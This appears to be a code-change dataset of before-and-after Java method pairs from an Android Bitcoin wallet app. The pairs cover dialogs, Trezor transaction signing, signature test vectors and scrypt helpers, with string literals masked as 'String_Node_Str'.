      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        selectedItem=i;
      }
    }
).setPositiveButton(R.string.button_ok,new DialogInterface.OnClickListener(){
      @Override public void onClick(      DialogInterface dialogInterface,      int i){
        UUID account;
        if (selectedItem == 0) {
          account=_mbwManager.getWalletManager(false).createSingleAddressAccount(address);
        }
 else {
          ColuAccount.ColuAsset coluAsset=ColuAccount.ColuAsset.getByType(ColuAccount.ColuAssetType.valueOf(list.get(selectedItem)),_mbwManager.getNetwork());
          account=_mbwManager.getColuManager().enableReadOnlyAsset(coluAsset,address);
        }
        finishOk(account);
      }
    }
).create().show();
  }
}"
91195,"@Override public void itemClick(final PartnerInfo bean){
  if (bean.getInfo() != null && bean.getInfo().length() > 0) {
    View custom=LayoutInflater.from(getActivity()).inflate(R.layout.main_recommendation_dialog_view,null,false);
    TextView part1=(TextView)custom.findViewById(R.id.part1);
    int pointIndex=bean.getInfo().indexOf(""String_Node_Str"") + 1;
    part1.setText(bean.getInfo().substring(0,pointIndex));
    TextView part2=(TextView)custom.findViewById(R.id.part2);
    part2.setText(bean.getInfo().substring(pointIndex));
    ((ImageView)custom.findViewById(R.id.image)).setImageResource(bean.getIcon());
    AlertDialog.Builder builder=new AlertDialog.Builder(getActivity());
    builder.setTitle(warning_partner);
    builder.setView(custom);
    builder.setPositiveButton(ok,new DialogInterface.OnClickListener(){
      public void onClick(      DialogInterface dialog,      int id){
        if (bean.getUri() != null) {
          Intent intent=new Intent(Intent.ACTION_VIEW);
          intent.setData(Uri.parse(bean.getUri()));
          startActivity(intent);
        }
      }
    }
);
    builder.setNegativeButton(cancel,null);
    AlertDialog dialog=builder.create();
    dialog.show();
  }
 else {
    if (bean.getUri() != null) {
      Intent i=new Intent(Intent.ACTION_VIEW);
      i.setData(Uri.parse(bean.getUri()));
      startActivity(i);
    }
  }
}","@Override public void itemClick(final PartnerInfo bean){
  if (bean.getInfo() != null && bean.getInfo().length() > 0) {
    View custom=LayoutInflater.from(getActivity()).inflate(R.layout.main_recommendation_dialog_view,null,false);
    TextView part1=(TextView)custom.findViewById(R.id.part1);
    int pointIndex=bean.getInfo().indexOf(""String_Node_Str"") + 1;
    part1.setText(bean.getInfo().substring(0,pointIndex));
    TextView part2=(TextView)custom.findViewById(R.id.part2);
    part2.setText(bean.getInfo().substring(pointIndex));
    ((ImageView)custom.findViewById(R.id.image)).setImageResource(bean.getIcon());
    AlertDialog.Builder builder=new AlertDialog.Builder(getActivity());
    builder.setTitle(warning_partner);
    builder.setView(custom);
    builder.setPositiveButton(ok,new DialogInterface.OnClickListener(){
      public void onClick(      DialogInterface dialog,      int id){
        if (bean.getUri() != null) {
          Intent intent=new Intent(Intent.ACTION_VIEW);
          intent.setData(Uri.parse(bean.getUri()));
          startActivity(intent);
        }
      }
    }
);
    builder.setNegativeButton(cancel,null);
    alertDialog=builder.create();
    alertDialog.show();
  }
 else {
    if (bean.getUri() != null) {
      Intent i=new Intent(Intent.ACTION_VIEW);
      i.setData(Uri.parse(bean.getUri()));
      startActivity(i);
    }
  }
}"
91196,"@Override public View onCreateView(LayoutInflater inflater,final ViewGroup container,Bundle savedInstanceState){
  View root=inflater.inflate(R.layout.main_recommendations_view,container,false);
  recommendationsList=(ListView)root.findViewById(R.id.list);
  ArrayList<PartnerInfo> list=new ArrayList<>();
  list.add(getPartnerInfo(partner_ledger,partner_ledger_short,partner_ledger_info,partner_ledger_url,R.drawable.ledger_icon));
  list.add(getPartnerInfo(partner_trezor,partner_trezor_short,partner_trezor_info,partner_trezor_url,R.drawable.trezor2));
  list.add(getPartnerInfo(partner_purse,partner_purse_short,partner_purse_info,partner_purse_url,R.drawable.purse_small));
  list.add(getPartnerInfo(partner_coinbase,partner_coinbase_short,partner_coinbase_info,partner_coinbase_url,R.drawable.coinbase));
  list.add(getPartnerInfo(partner_hashing24,partner_hashing24_short,partner_hashing24_info,partner_hashing24_url,R.drawable.hashing24));
  View footerView=getActivity().getLayoutInflater().inflate(R.layout.main_recommendations_list_footer,null,false);
  recommendationsList.addFooterView(footerView);
  moreInformation=(TextView)footerView.findViewById(R.id.tvMoreInformation);
  moreInformation.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      View custom=LayoutInflater.from(view.getContext()).inflate(R.layout.main_recommendation_dialog_view,null,false);
      TextView part1=(TextView)custom.findViewById(R.id.part1);
      part1.setText(partner_more_info_text_part1);
      TextView part2=(TextView)custom.findViewById(R.id.part2);
      part2.setText(partner_more_info_text_part2);
      ((ImageView)custom.findViewById(R.id.image)).setImageResource(R.drawable.mycelium_logo_transp);
      AlertDialog.Builder builder=new AlertDialog.Builder(view.getContext());
      builder.setTitle(partner_more_info);
      builder.setPositiveButton(ok,new DialogInterface.OnClickListener(){
        @Override public void onClick(        DialogInterface dialogInterface,        int i){
        }
      }
);
      builder.setView(custom);
      AlertDialog dialog=builder.create();
      dialog.show();
    }
  }
);
  RecommendationAdapter adapter=new RecommendationAdapter(getActivity(),R.layout.main_recommendations_list_item,list);
  recommendationsList.setAdapter(adapter);
  adapter.setClickListener(new RecommendationAdapter.ClickListener(){
    @Override public void itemClick(    final PartnerInfo bean){
      if (bean.getInfo() != null && bean.getInfo().length() > 0) {
        View custom=LayoutInflater.from(getActivity()).inflate(R.layout.main_recommendation_dialog_view,null,false);
        TextView part1=(TextView)custom.findViewById(R.id.part1);
        int pointIndex=bean.getInfo().indexOf(""String_Node_Str"") + 1;
        part1.setText(bean.getInfo().substring(0,pointIndex));
        TextView part2=(TextView)custom.findViewById(R.id.part2);
        part2.setText(bean.getInfo().substring(pointIndex));
        ((ImageView)custom.findViewById(R.id.image)).setImageResource(bean.getIcon());
        AlertDialog.Builder builder=new AlertDialog.Builder(getActivity());
        builder.setTitle(warning_partner);
        builder.setView(custom);
        builder.setPositiveButton(ok,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface dialog,          int id){
            if (bean.getUri() != null) {
              Intent intent=new Intent(Intent.ACTION_VIEW);
              intent.setData(Uri.parse(bean.getUri()));
              startActivity(intent);
            }
          }
        }
);
        builder.setNegativeButton(cancel,null);
        AlertDialog dialog=builder.create();
        dialog.show();
      }
 else {
        if (bean.getUri() != null) {
          Intent i=new Intent(Intent.ACTION_VIEW);
          i.setData(Uri.parse(bean.getUri()));
          startActivity(i);
        }
      }
    }
  }
);
  return root;
}","@Override public View onCreateView(LayoutInflater inflater,final ViewGroup container,Bundle savedInstanceState){
  View root=inflater.inflate(R.layout.main_recommendations_view,container,false);
  recommendationsList=(ListView)root.findViewById(R.id.list);
  ArrayList<PartnerInfo> list=new ArrayList<>();
  list.add(getPartnerInfo(partner_ledger,partner_ledger_short,partner_ledger_info,partner_ledger_url,R.drawable.ledger_icon));
  list.add(getPartnerInfo(partner_trezor,partner_trezor_short,partner_trezor_info,partner_trezor_url,R.drawable.trezor2));
  list.add(getPartnerInfo(partner_purse,partner_purse_short,partner_purse_info,partner_purse_url,R.drawable.purse_small));
  list.add(getPartnerInfo(partner_coinbase,partner_coinbase_short,partner_coinbase_info,partner_coinbase_url,R.drawable.coinbase));
  list.add(getPartnerInfo(partner_hashing24,partner_hashing24_short,partner_hashing24_info,partner_hashing24_url,R.drawable.hashing24));
  View footerView=getActivity().getLayoutInflater().inflate(R.layout.main_recommendations_list_footer,null,false);
  recommendationsList.addFooterView(footerView);
  moreInformation=(TextView)footerView.findViewById(R.id.tvMoreInformation);
  moreInformation.setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View view){
      View custom=LayoutInflater.from(view.getContext()).inflate(R.layout.main_recommendation_dialog_view,null,false);
      TextView part1=(TextView)custom.findViewById(R.id.part1);
      part1.setText(partner_more_info_text_part1);
      TextView part2=(TextView)custom.findViewById(R.id.part2);
      part2.setText(partner_more_info_text_part2);
      ((ImageView)custom.findViewById(R.id.image)).setImageResource(R.drawable.mycelium_logo_transp);
      AlertDialog.Builder builder=new AlertDialog.Builder(view.getContext());
      builder.setTitle(partner_more_info);
      builder.setPositiveButton(ok,new DialogInterface.OnClickListener(){
        @Override public void onClick(        DialogInterface dialogInterface,        int i){
        }
      }
);
      builder.setView(custom);
      alertDialog=builder.create();
      alertDialog.show();
    }
  }
);
  RecommendationAdapter adapter=new RecommendationAdapter(getActivity(),R.layout.main_recommendations_list_item,list);
  recommendationsList.setAdapter(adapter);
  adapter.setClickListener(new RecommendationAdapter.ClickListener(){
    @Override public void itemClick(    final PartnerInfo bean){
      if (bean.getInfo() != null && bean.getInfo().length() > 0) {
        View custom=LayoutInflater.from(getActivity()).inflate(R.layout.main_recommendation_dialog_view,null,false);
        TextView part1=(TextView)custom.findViewById(R.id.part1);
        int pointIndex=bean.getInfo().indexOf(""String_Node_Str"") + 1;
        part1.setText(bean.getInfo().substring(0,pointIndex));
        TextView part2=(TextView)custom.findViewById(R.id.part2);
        part2.setText(bean.getInfo().substring(pointIndex));
        ((ImageView)custom.findViewById(R.id.image)).setImageResource(bean.getIcon());
        AlertDialog.Builder builder=new AlertDialog.Builder(getActivity());
        builder.setTitle(warning_partner);
        builder.setView(custom);
        builder.setPositiveButton(ok,new DialogInterface.OnClickListener(){
          public void onClick(          DialogInterface dialog,          int id){
            if (bean.getUri() != null) {
              Intent intent=new Intent(Intent.ACTION_VIEW);
              intent.setData(Uri.parse(bean.getUri()));
              startActivity(intent);
            }
          }
        }
);
        builder.setNegativeButton(cancel,null);
        alertDialog=builder.create();
        alertDialog.show();
      }
 else {
        if (bean.getUri() != null) {
          Intent i=new Intent(Intent.ACTION_VIEW);
          i.setData(Uri.parse(bean.getUri()));
          startActivity(i);
        }
      }
    }
  }
);
  return root;
}"
91197,"@Override public Transaction getSignedTransaction(StandardTransactionBuilder.UnsignedTransaction unsigned,Bip44AccountExternalSignature forAccount){
  if (!initialize()) {
    return null;
  }
  setState(Status.readyToScan,currentAccountState);
  TrezorMessage.SignTx signTx=TrezorMessage.SignTx.newBuilder().setCoinName(getNetwork().getCoinName()).setInputsCount(unsigned.getFundingOutputs().length).setOutputsCount(unsigned.getOutputs().length).build();
  Message response;
  try {
    response=getSignatureDevice().send(signTx);
  }
 catch (  ExtSigDeviceConnectionException ex) {
    postErrorMessage(ex.getMessage());
    return null;
  }
  StandardTransactionBuilder.SigningRequest[] signatureInfo=unsigned.getSignatureInfo();
  ByteWriter signedTx=new ByteWriter(1024);
  while (true) {
    try {
      response=filterMessages(response);
    }
 catch (    ExtSigDeviceConnectionException ex) {
      postErrorMessage(ex.getMessage());
      return null;
    }
    if (response == null) {
      return null;
    }
    if (!(response instanceof TrezorMessage.TxRequest)) {
      Log.e(""String_Node_Str"",""String_Node_Str"" + response.getClass().toString());
      return null;
    }
    TrezorMessage.TxRequest txRequest=(TrezorMessage.TxRequest)response;
    if (txRequest.hasSerialized() && txRequest.getSerialized().hasSerializedTx()) {
      signedTx.putBytes(txRequest.getSerialized().getSerializedTx().toByteArray());
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXFINISHED) {
      break;
    }
    TrezorType.TxRequestDetailsType txRequestDetailsType=txRequest.getDetails();
    Log.d(""String_Node_Str"",""String_Node_Str"" + txRequest.getRequestType().toString());
    Transaction currentTx;
    if (txRequestDetailsType.hasTxHash()) {
      Sha256Hash requestHash=Sha256Hash.of(txRequestDetailsType.getTxHash().toByteArray());
      currentTx=TransactionEx.toTransaction(forAccount.getTransaction(requestHash));
    }
 else {
      currentTx=Transaction.fromUnsignedTransaction(unsigned);
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXMETA) {
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().setInputsCnt(currentTx.inputs.length).setOutputsCnt(currentTx.outputs.length).setVersion(currentTx.version).setLockTime(currentTx.lockTime).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXINPUT) {
      TransactionInput ak_input=currentTx.inputs[txRequestDetailsType.getRequestIndex()];
      ByteString prevHash=ByteString.copyFrom(ak_input.outPoint.hash.getBytes());
      ByteString scriptSig=ByteString.copyFrom(ak_input.script.getScriptBytes());
      TrezorType.TxInputType.Builder txInputBuilder=TrezorType.TxInputType.newBuilder().setPrevHash(prevHash).setPrevIndex(ak_input.outPoint.index).setSequence(ak_input.sequence).setScriptSig(scriptSig);
      if (!txRequestDetailsType.hasTxHash()) {
        StandardTransactionBuilder.SigningRequest signingRequest=signatureInfo[txRequestDetailsType.getRequestIndex()];
        Address toSignWith=signingRequest.publicKey.toAddress(getNetwork());
        if (toSignWith != null) {
          Optional<Integer[]> addId=forAccount.getAddressId(toSignWith);
          if (addId.isPresent()) {
            new InputAddressSetter(txInputBuilder).setAddressN(forAccount.getAccountIndex(),addId.get());
          }
        }
 else {
          Log.w(""String_Node_Str"",""String_Node_Str"" + txRequestDetailsType.getRequestIndex());
        }
      }
      TrezorType.TxInputType txInput=txInputBuilder.build();
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().addInputs(txInput).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXOUTPUT) {
      TransactionOutput ak_output=currentTx.outputs[txRequestDetailsType.getRequestIndex()];
      TrezorType.TransactionType txType;
      if (txRequestDetailsType.hasTxHash()) {
        ByteString scriptPubKey=ByteString.copyFrom(ak_output.script.getScriptBytes());
        TrezorType.TxOutputBinType txOutput=TrezorType.TxOutputBinType.newBuilder().setScriptPubkey(scriptPubKey).setAmount(ak_output.value).build();
        txType=TrezorType.TransactionType.newBuilder().addBinOutputs(txOutput).build();
      }
 else {
        Address address=ak_output.script.getAddress(getNetwork());
        TrezorType.TxOutputType.Builder txOutput=TrezorType.TxOutputType.newBuilder().setAddress(address.toString()).setAmount(ak_output.value).setScriptType(mapScriptType(ak_output.script));
        Optional<Integer[]> addId=forAccount.getAddressId(address);
        if (addId.isPresent() && addId.get()[0] == 1) {
          new OutputAddressSetter(txOutput).setAddressN(forAccount.getAccountIndex(),addId.get());
        }
        txType=TrezorType.TransactionType.newBuilder().addOutputs(txOutput.build()).build();
      }
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
  }
  Transaction ret;
  try {
    ret=Transaction.fromByteReader(new ByteReader(signedTx.toBytes()));
  }
 catch (  Transaction.TransactionParsingException e) {
    Log.e(""String_Node_Str"",""String_Node_Str"" + e.getMessage(),e);
    return null;
  }
  return ret;
}","@Override public Transaction getSignedTransaction(UnsignedTransaction unsigned,Bip44AccountExternalSignature forAccount){
  if (!initialize()) {
    return null;
  }
  setState(Status.readyToScan,currentAccountState);
  SignTx signTx=SignTx.newBuilder().setCoinName(getNetwork().getCoinName()).setInputsCount(unsigned.getFundingOutputs().length).setOutputsCount(unsigned.getOutputs().length).build();
  Message response;
  try {
    response=getSignatureDevice().send(signTx);
  }
 catch (  ExtSigDeviceConnectionException ex) {
    postErrorMessage(ex.getMessage());
    return null;
  }
  SigningRequest[] signatureInfo=unsigned.getSignatureInfo();
  ByteWriter signedTx=new ByteWriter(1024);
  while (true) {
    try {
      response=filterMessages(response);
    }
 catch (    ExtSigDeviceConnectionException ex) {
      postErrorMessage(ex.getMessage());
      return null;
    }
    if (response == null) {
      return null;
    }
    if (!(response instanceof TxRequest)) {
      Log.e(""String_Node_Str"",""String_Node_Str"" + response.getClass().toString());
      return null;
    }
    TxRequest txRequest=(TxRequest)response;
    if (txRequest.hasSerialized() && txRequest.getSerialized().hasSerializedTx()) {
      signedTx.putBytes(txRequest.getSerialized().getSerializedTx().toByteArray());
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXFINISHED) {
      break;
    }
    TrezorType.TxRequestDetailsType txRequestDetailsType=txRequest.getDetails();
    Log.d(""String_Node_Str"",""String_Node_Str"" + txRequest.getRequestType().toString());
    Transaction currentTx;
    if (txRequestDetailsType.hasTxHash()) {
      Sha256Hash requestHash=Sha256Hash.of(txRequestDetailsType.getTxHash().toByteArray());
      currentTx=TransactionEx.toTransaction(forAccount.getTransaction(requestHash));
    }
 else {
      currentTx=Transaction.fromUnsignedTransaction(unsigned);
    }
    if (txRequest.getRequestType() == TrezorType.RequestType.TXMETA) {
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().setInputsCnt(currentTx.inputs.length).setOutputsCnt(currentTx.outputs.length).setVersion(currentTx.version).setLockTime(currentTx.lockTime).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXINPUT) {
      TransactionInput ak_input=currentTx.inputs[txRequestDetailsType.getRequestIndex()];
      ByteString prevHash=ByteString.copyFrom(ak_input.outPoint.hash.getBytes());
      ByteString scriptSig=ByteString.copyFrom(ak_input.script.getScriptBytes());
      TrezorType.TxInputType.Builder txInputBuilder=TrezorType.TxInputType.newBuilder().setPrevHash(prevHash).setPrevIndex(ak_input.outPoint.index).setSequence(ak_input.sequence).setScriptSig(scriptSig);
      if (!txRequestDetailsType.hasTxHash()) {
        SigningRequest signingRequest=signatureInfo[txRequestDetailsType.getRequestIndex()];
        Address toSignWith=signingRequest.publicKey.toAddress(getNetwork());
        if (toSignWith != null) {
          Optional<Integer[]> addId=forAccount.getAddressId(toSignWith);
          if (addId.isPresent()) {
            new InputAddressSetter(txInputBuilder).setAddressN(forAccount.getAccountIndex(),addId.get());
          }
        }
 else {
          Log.w(""String_Node_Str"",""String_Node_Str"" + txRequestDetailsType.getRequestIndex());
        }
      }
      TrezorType.TxInputType txInput=txInputBuilder.build();
      TrezorType.TransactionType txType=TrezorType.TransactionType.newBuilder().addInputs(txInput).build();
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
 else     if (txRequest.getRequestType() == TrezorType.RequestType.TXOUTPUT) {
      TransactionOutput ak_output=currentTx.outputs[txRequestDetailsType.getRequestIndex()];
      TrezorType.TransactionType txType;
      if (txRequestDetailsType.hasTxHash()) {
        ByteString scriptPubKey=ByteString.copyFrom(ak_output.script.getScriptBytes());
        TrezorType.TxOutputBinType txOutput=TrezorType.TxOutputBinType.newBuilder().setScriptPubkey(scriptPubKey).setAmount(ak_output.value).build();
        txType=TrezorType.TransactionType.newBuilder().addBinOutputs(txOutput).build();
      }
 else {
        Address address=ak_output.script.getAddress(getNetwork());
        TrezorType.TxOutputType.Builder txOutput=TrezorType.TxOutputType.newBuilder().setAddress(address.toString()).setAmount(ak_output.value).setScriptType(mapScriptType(ak_output.script));
        Optional<Integer[]> addId=forAccount.getAddressId(address);
        if (addId.isPresent() && addId.get()[0] == 1) {
          new OutputAddressSetter(txOutput).setAddressN(forAccount.getAccountIndex(),addId.get());
        }
        txType=TrezorType.TransactionType.newBuilder().addOutputs(txOutput.build()).build();
      }
      TrezorMessage.TxAck txAck=TrezorMessage.TxAck.newBuilder().setTx(txType).build();
      response=getSignatureDevice().send(txAck);
    }
  }
  Transaction ret;
  try {
    ret=Transaction.fromByteReader(new ByteReader(signedTx.toBytes()));
    checkSignedTransaction(unsigned,signedTx);
  }
 catch (  Transaction.TransactionParsingException e) {
    postErrorMessage(""String_Node_Str"");
    Log.e(""String_Node_Str"",""String_Node_Str"" + e.getMessage(),e);
    return null;
  }
catch (  ScriptException e) {
    postErrorMessage(""String_Node_Str"");
    Log.e(TAG,""String_Node_Str"",e);
    return null;
  }
  return ret;
}"
91198,"public SignatureTestVector(String pk,String message,String signatureDer) throws UnsupportedEncodingException {
  final Signature signature=Signatures.decodeSignatureParameters(new ByteReader(HexUtils.toBytes(signatureDer)));
  this.pk=new InMemoryPrivateKey(HexUtils.toBytes(pk),true);
  this.message=message.getBytes(""String_Node_Str"");
  this.r=signature.r;
  this.s=signature.s;
}","SignatureTestVector(String pk,String message,String signatureDer) throws UnsupportedEncodingException {
  final Signature signature=Signatures.decodeSignatureParameters(new ByteReader(HexUtils.toBytes(signatureDer)));
  this.pk=new InMemoryPrivateKey(HexUtils.toBytes(pk),true);
  this.message=message.getBytes(""String_Node_Str"");
  this.r=signature.r;
  this.s=signature.s;
}"
91199,"/** 
 * Check if the signatures are RFC6979 compliant, by using various test vectors
 */
@Test public void checkDeterministicSig() throws UnsupportedEncodingException {
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
  new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"").check();
}","/** 
 * Check if the signatures are RFC6979 compliant, by using various test vectors
 */
@Test public void checkDeterministicSig() throws UnsupportedEncodingException {
  for (  SignatureTestVector stv : new SignatureTestVector[]{new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str""),new SignatureTestVector(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"")}) {
    stv.check();
  }
}"
91200,"private void Source(int index){
  _index=index;
}","void Source(int index){
  _index=index;
}"
91201,"private void Tag(int index){
  _index=index;
}","void Tag(int index){
  _index=index;
}"
91202,"@Override public void onCreate(Bundle savedInstanceState){
  this.requestWindowFeature(Window.FEATURE_NO_TITLE);
  super.onCreate(savedInstanceState);
  setView();
  _mbwManager=MbwManager.getInstance(getApplication());
  UUID accountId=Preconditions.checkNotNull((UUID)getIntent().getSerializableExtra(""String_Node_Str""));
  _isColdStorage=getIntent().getBooleanExtra(""String_Node_Str"",false);
  _account=Preconditions.checkNotNull(_mbwManager.getWalletManager(_isColdStorage).getAccount(accountId));
  _unsigned=Preconditions.checkNotNull((StandardTransactionBuilder.UnsignedTransaction)getIntent().getSerializableExtra(""String_Node_Str""));
  if (savedInstanceState != null) {
    _transaction=(Transaction)savedInstanceState.getSerializable(""String_Node_Str"");
  }
}","@Override public void onCreate(Bundle savedInstanceState){
  this.requestWindowFeature(Window.FEATURE_NO_TITLE);
  super.onCreate(savedInstanceState);
  setView();
  _mbwManager=MbwManager.getInstance(getApplication());
  UUID accountId=Preconditions.checkNotNull((UUID)getIntent().getSerializableExtra(""String_Node_Str""));
  _isColdStorage=getIntent().getBooleanExtra(""String_Node_Str"",false);
  _account=Preconditions.checkNotNull(_mbwManager.getWalletManager(_isColdStorage).getAccount(accountId));
  _unsigned=Preconditions.checkNotNull((UnsignedTransaction)getIntent().getSerializableExtra(""String_Node_Str""));
  if (savedInstanceState != null) {
    _transaction=(Transaction)savedInstanceState.getSerializable(""String_Node_Str"");
  }
}"
91203,"public static Intent getIntent(Activity currentActivity,UUID account,boolean isColdStorage,StandardTransactionBuilder.UnsignedTransaction unsigned){
  WalletAccount walletAccount=MbwManager.getInstance(currentActivity).getWalletManager(isColdStorage).getAccount(account);
  Class targetClass;
  if (walletAccount instanceof Bip44AccountExternalSignature) {
    final int bip44AccountType=((Bip44AccountExternalSignature)walletAccount).getBIP44AccountType();
switch (bip44AccountType) {
case (Bip44AccountContext.ACCOUNT_TYPE_UNRELATED_X_PUB_EXTERNAL_SIG_LEDGER):
      targetClass=LedgerSignTransactionActivity.class;
    break;
case (Bip44AccountContext.ACCOUNT_TYPE_UNRELATED_X_PUB_EXTERNAL_SIG_KEEPKEY):
  targetClass=KeepKeySignTransactionActivity.class;
break;
case (Bip44AccountContext.ACCOUNT_TYPE_UNRELATED_X_PUB_EXTERNAL_SIG_TREZOR):
targetClass=TrezorSignTransactionActivity.class;
break;
default :
throw new RuntimeException(""String_Node_Str"" + bip44AccountType);
}
}
 else {
targetClass=SignTransactionActivity.class;
}
Preconditions.checkNotNull(account);
return new Intent(currentActivity,targetClass).putExtra(""String_Node_Str"",account).putExtra(""String_Node_Str"",isColdStorage).putExtra(""String_Node_Str"",unsigned);
}","public static Intent getIntent(Activity currentActivity,UUID account,boolean isColdStorage,UnsignedTransaction unsigned){
  WalletAccount walletAccount=MbwManager.getInstance(currentActivity).getWalletManager(isColdStorage).getAccount(account);
  Class targetClass;
  if (walletAccount instanceof Bip44AccountExternalSignature) {
    final int bip44AccountType=((Bip44AccountExternalSignature)walletAccount).getBIP44AccountType();
switch (bip44AccountType) {
case (Bip44AccountContext.ACCOUNT_TYPE_UNRELATED_X_PUB_EXTERNAL_SIG_LEDGER):
      targetClass=LedgerSignTransactionActivity.class;
    break;
case (Bip44AccountContext.ACCOUNT_TYPE_UNRELATED_X_PUB_EXTERNAL_SIG_KEEPKEY):
  targetClass=KeepKeySignTransactionActivity.class;
break;
case (Bip44AccountContext.ACCOUNT_TYPE_UNRELATED_X_PUB_EXTERNAL_SIG_TREZOR):
targetClass=TrezorSignTransactionActivity.class;
break;
default :
throw new RuntimeException(""String_Node_Str"" + bip44AccountType);
}
}
 else {
targetClass=SignTransactionActivity.class;
}
Preconditions.checkNotNull(account);
return new Intent(currentActivity,targetClass).putExtra(""String_Node_Str"",account).putExtra(""String_Node_Str"",isColdStorage).putExtra(""String_Node_Str"",unsigned);
}"
91204,"public static void callMe(Activity currentActivity,UUID account,boolean isColdStorage,StandardTransactionBuilder.UnsignedTransaction unsigned,int requestCode){
  currentActivity.startActivityForResult(getIntent(currentActivity,account,isColdStorage,unsigned),requestCode);
}","public static void callMe(Activity currentActivity,UUID account,boolean isColdStorage,UnsignedTransaction unsigned,int requestCode){
  currentActivity.startActivityForResult(getIntent(currentActivity,account,isColdStorage,unsigned),requestCode);
}"
91205,"public static int integerify(byte[] B,int Bi,int r){
  int n;
  Bi+=(2 * r - 1) * 64;
  n=(B[Bi + 0] & 0xff) << 0;
  n|=(B[Bi + 1] & 0xff) << 8;
  n|=(B[Bi + 2] & 0xff) << 16;
  n|=(B[Bi + 3] & 0xff) << 24;
  return n;
}","private static int integerify(byte[] B,int Bi,int r){
  int n;
  Bi+=(2 * r - 1) * 64;
  n=(B[Bi + 0] & 0xff) << 0;
  n|=(B[Bi + 1] & 0xff) << 8;
  n|=(B[Bi + 2] & 0xff) << 16;
  n|=(B[Bi + 3] & 0xff) << 24;
  return n;
}"
91206,"public static void smix(byte[] B,int Bi,int r,int N,byte[][] V,byte[] XY,SCryptProgress progressTracker) throws InterruptedException {
  int Xi=0;
  int Yi=128 * r;
  int i;
  arraycopy(B,Bi,XY,Xi,128 * r);
  for (i=0; i < N; i++) {
    arraycopy(XY,Xi,V[i],0,128 * r);
    blockmix_salsa8(XY,Xi,Yi,r);
    if (progressTracker != null) {
      progressTracker.setProgressN1(i);
    }
  }
  for (i=0; i < N; i++) {
    int j=integerify(XY,Xi,r) & (N - 1);
    blockxor(V[j],0,XY,Xi,128 * r);
    blockmix_salsa8(XY,Xi,Yi,r);
    if (progressTracker != null) {
      progressTracker.setProgressN2(i);
    }
  }
  arraycopy(XY,Xi,B,Bi,128 * r);
}","private static void smix(byte[] B,int Bi,int r,int N,byte[][] V,byte[] XY,SCryptProgress progressTracker) throws InterruptedException {
  int Xi=0;
  int Yi=128 * r;
  int i;
  arraycopy(B,Bi,XY,Xi,128 * r);
  for (i=0; i < N; i++) {
    arraycopy(XY,Xi,V[i],0,128 * r);
    blockmix_salsa8(XY,Xi,Yi,r);
    if (progressTracker != null) {
      progressTracker.setProgressN1(i);
    }
  }
  for (i=0; i < N; i++) {
    int j=integerify(XY,Xi,r) & (N - 1);
    blockxor(V[j],0,XY,Xi,128 * r);
    blockmix_salsa8(XY,Xi,Yi,r);
    if (progressTracker != null) {
      progressTracker.setProgressN2(i);
    }
  }
  arraycopy(XY,Xi,B,Bi,128 * r);
}"
91207,"/** 
 * Implementation of the <a href=""http://www.tarsnap.com/scrypt/scrypt.pdf""/>scrypt KDF</a>. Calls the native implementation   {@link #scryptN} when the native library wassuccessfully loaded, otherwise calls  {@link #scryptJ}.
 * @param passwd Password.
 * @param salt Salt.
 * @param N CPU cost parameter.
 * @param r Memory cost parameter.
 * @param p Parallelization parameter.
 * @param dkLen Intended length of the derived key.
 * @return The derived key.
 * @throws GeneralSecurityException when HMAC_SHA256 is not available.
 * @throws InterruptedException
 */
public static byte[] scrypt(byte[] passwd,byte[] salt,int N,int r,int p,int dkLen,SCryptProgress progressTracker) throws GeneralSecurityException, InterruptedException {
  return native_library_loaded ? scryptN(passwd,salt,N,r,p,dkLen) : scryptJ(passwd,salt,N,r,p,dkLen,progressTracker);
}","/** 
 * Pure Java implementation of the <a href=""http://www.tarsnap.com/scrypt/scrypt.pdf""/>scrypt KDF</a>.
 * @param passwd Password.
 * @param salt Salt.
 * @param N CPU cost parameter.
 * @param r Memory cost parameter.
 * @param p Parallelization parameter.
 * @param dkLen Intended length of the derived key.
 * @return The derived key.
